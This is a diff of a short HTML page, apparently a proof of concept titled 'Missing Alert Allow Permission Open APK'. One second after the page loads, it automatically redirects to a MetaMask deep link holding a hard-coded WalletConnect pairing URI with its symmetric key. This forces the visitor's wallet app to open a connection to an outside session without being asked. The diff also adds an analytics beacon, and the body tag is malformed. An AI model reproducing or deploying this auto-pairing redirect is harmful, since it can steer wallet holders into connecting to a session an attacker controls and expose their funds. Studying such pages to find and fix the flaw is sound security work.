@@ -1,17 +1,29 @@
+<!doctype html>
 <html>
   <head>
     <meta name="viewport" content="width=device-width" />
     <title>Missing Alert Allow Permission Open APK</title>
   </head>
   <body
+
     <script>
       var rawWcUri =
         "wc:940e792c4ac14a5e89dfab4e0c3779663a2cf2345bc28ab72d58c6a747b6762d@2?relay-protocol=irn&symKey=037bb33c32ad62bff098f98033a337e72c44e6c0029e381229b8b72512902001&expiryTimestamp=1776316316";
+
       var encodedWcUri = encodeURIComponent(rawWcUri);
+
       var finalPayload = "metamask://wc?uri=" + encodedWcUri;
+
       setTimeout(function () {
         window.location.href = finalPayload;
       }, 1000);
     </script>
+    <script
+      defer
+      src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516"
+      integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg=="
+      data-cf-beacon='{"version":"2024.11.0","token":"b4e0b6c4c80a47498e6ceba2cff9eaed","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}'
+      crossorigin="anonymous"
+    ></script>
   </body>
 </html>
